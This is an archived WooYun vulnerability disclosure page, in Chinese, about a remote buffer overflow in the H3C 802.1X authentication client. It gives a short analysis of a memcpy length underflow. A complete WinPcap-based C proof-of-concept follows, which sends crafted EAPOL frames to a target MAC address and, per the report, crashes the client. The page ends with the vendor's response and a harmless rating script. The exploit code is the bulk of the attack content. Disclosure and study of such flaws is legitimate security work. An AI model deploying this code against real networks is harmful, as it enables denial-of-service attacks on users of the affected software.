@@ -1,0 +1,407 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		H3C 802.1X客户端远程缓冲区溢出漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		H3C 802.1X客户端远程缓冲区溢出漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/cssembly">cssembly</a> 
+</li><li>提交时间：		2013-03-18 20:46</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-03-22：	细节向第三方安全合作伙伴开放<br/>
+									2013-03-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-08：	细节向普通白帽子公开<br/>
+									2013-04-28：	细节向实习白帽子公开<br/>
+									2013-06-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">H3C 802.1X客户端未对关键数据做校验，导致缓冲区溢出</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">sub_4030E0函数，在4031F6点处调用memcpy函数，而memcpy函数的缓冲区长度字段如果恶意构造，就能导致减去2以后就能变成0xFFFFFFFF,最终导致缓冲区溢出<br />
+<br />
+</p><p class="detail"><a href="../images/18200306ae240f9f7e1a2e5d75f062faeb9908d3.png" target="_blank"><img src="../images/18200306ae240f9f7e1a2e5d75f062faeb9908d3.png" alt=".PNG" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">poc代码如下：<br />
+<br />
+#include &lt;pcap.h&gt;<br />
+<br />
+<br />
+<br />
+#pragma comment( lib , &quot;wpcap.lib&quot; )<br />
+<br />
+<br />
+<br />
+int _tmain(int argc, _TCHAR* argv[])<br />
+<br />
+{<br />
+<br />
+<br />
+<br />
+	pcap_t *fp;<br />
+<br />
+	char errbuf[PCAP_ERRBUF_SIZE];<br />
+<br />
+	u_char packet[3000];<br />
+<br />
+	pcap_if_t *alldevs;<br />
+<br />
+<br />
+<br />
+	/* Check the validity of the command line */<br />
+<br />
+	if(pcap_findalldevs(&amp;alldevs, errbuf) == -1)<br />
+<br />
+	{<br />
+<br />
+		fprintf(stderr,&quot;Error in pcap_findalldevs: %s\n&quot;, errbuf);<br />
+<br />
+		exit(1);<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	pcap_if_t *d;<br />
+<br />
+	int i = 0;<br />
+<br />
+	/* Print the list */<br />
+<br />
+	for(d=alldevs; d; d=d-&gt;next)<br />
+<br />
+	{<br />
+<br />
+		printf(&quot;%d. %s&quot;, ++i, d-&gt;name);<br />
+<br />
+		if (d-&gt;description)<br />
+<br />
+			printf(&quot; (%s)\n&quot;, d-&gt;description);<br />
+<br />
+		else<br />
+<br />
+			printf(&quot; (No description available)\n&quot;);<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	/* 选择相应网卡*/<br />
+<br />
+	if ((fp = pcap_open_live(alldevs-&gt;name,		// name of the device<br />
+<br />
+		65536,			// portion of the packet to capture. It doesn&#039;t matter in this case <br />
+<br />
+		1,				// promiscuous mode (nonzero means promiscuous)<br />
+<br />
+		1000,			// read timeout<br />
+<br />
+		errbuf			// error buffer<br />
+<br />
+		)) == NULL)<br />
+<br />
+	{<br />
+<br />
+		fprintf(stderr,&quot;\nUnable to open the adapter. %s is not supported by WinPcap\n&quot;, argv[1]);<br />
+<br />
+		return 2;<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	memset( packet , 0 , 1000 );<br />
+<br />
+	<br />
+<br />
+	/* 目标机器mac地址 */<br />
+<br />
+	packet[0]= 0x00;<br />
+<br />
+	packet[1]= 0x0C;<br />
+<br />
+	packet[2]= 0x29;<br />
+<br />
+	packet[3]= 0x0F;<br />
+<br />
+	packet[4]= 0x63;<br />
+<br />
+	packet[5]= 0xDD;<br />
+<br />
+<br />
+<br />
+	/* set mac source to 2:2:2:2:2:2 */<br />
+<br />
+	packet[6]= 2;<br />
+<br />
+	packet[7]= 2;<br />
+<br />
+	packet[8]= 2;<br />
+<br />
+	packet[9]= 2;<br />
+<br />
+	packet[10]= 2;<br />
+<br />
+	packet[11]= 2;<br />
+<br />
+<br />
+<br />
+	/* 协议头 */<br />
+<br />
+	packet[12] = 0x88;<br />
+<br />
+	packet[13] = 0x8e;<br />
+<br />
+	packet[14] = 0x01;<br />
+<br />
+	packet[15] = 0x00;<br />
+<br />
+<br />
+<br />
+	packet[16] = 0xFF;<br />
+<br />
+	packet[17] = 0xFF;<br />
+<br />
+	packet[18] = 0x01;<br />
+<br />
+	packet[19] = 0x03;<br />
+<br />
+	packet[20] = 0x05;//<br />
+<br />
+	packet[22] = 0x01;<br />
+<br />
+<br />
+<br />
+	if (pcap_sendpacket(fp,	// Adapter<br />
+<br />
+		packet,				// buffer with the packet<br />
+<br />
+		100	// size<br />
+<br />
+		) != 0)<br />
+<br />
+	{<br />
+<br />
+		fprintf(stderr,&quot;\nError sending the packet: %s\n&quot;, pcap_geterr(fp));<br />
+<br />
+		return 3;<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	packet[22] = 0x07;<br />
+<br />
+	if (pcap_sendpacket(fp,	// Adapter<br />
+<br />
+		packet,				// buffer with the packet<br />
+<br />
+		100	// size<br />
+<br />
+		) != 0)<br />
+<br />
+	{<br />
+<br />
+		fprintf(stderr,&quot;\nError sending the packet: %s\n&quot;, pcap_geterr(fp));<br />
+<br />
+		return 3;<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	packet[18] = 0x0A;<br />
+<br />
+	packet[19] = 0x03;<br />
+<br />
+	packet[20] = 0x05;//<br />
+<br />
+	packet[22] = 0x19;//<br />
+<br />
+	packet[23] = 0x19;//<br />
+<br />
+	packet[24] = 0x39;//<br />
+<br />
+	packet[25] = 0x00;//<br />
+<br />
+	/* Send down the packet */<br />
+<br />
+	if (pcap_sendpacket(fp,	// Adapter<br />
+<br />
+		packet,				// buffer with the packet<br />
+<br />
+		100	// size<br />
+<br />
+		) != 0)<br />
+<br />
+	{<br />
+<br />
+		fprintf(stderr,&quot;\nError sending the packet: %s\n&quot;, pcap_geterr(fp));<br />
+<br />
+		return 3;<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+	pcap_close(fp);	<br />
+<br />
+	return 0;<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+运行客户端，输入用户名密码<br />
+<br />
+</p><p class="detail"><a href="../images/182008067a9ee1dad59c0a0c9138bdaec3a00d0b.png" target="_blank"><img src="../images/182008067a9ee1dad59c0a0c9138bdaec3a00d0b.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+点击开始认知<br />
+<br />
+</p><p class="detail"><a href="../images/18200853130597665901df8ee41b9efd1c3b7e28.png" target="_blank"><img src="../images/18200853130597665901df8ee41b9efd1c3b7e28.png" alt="1.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+运行攻击代码，程序溢出崩溃<br />
+<br />
+</p><p class="detail"><a href="../images/182010059ee8a48078d2cf3a99d5c9b86fb6c7e2.png" target="_blank"><img src="../images/182010059ee8a48078d2cf3a99d5c9b86fb6c7e2.png" alt="2.PNG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/cssembly" title="cssembly">cssembly</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020272" title="H3C 802.1X客户端远程缓冲区溢出漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2013-03-19 08:54</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">H3C现不属于华为，请将漏洞转至CNERT或者直接联系厂商，谢谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20272";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
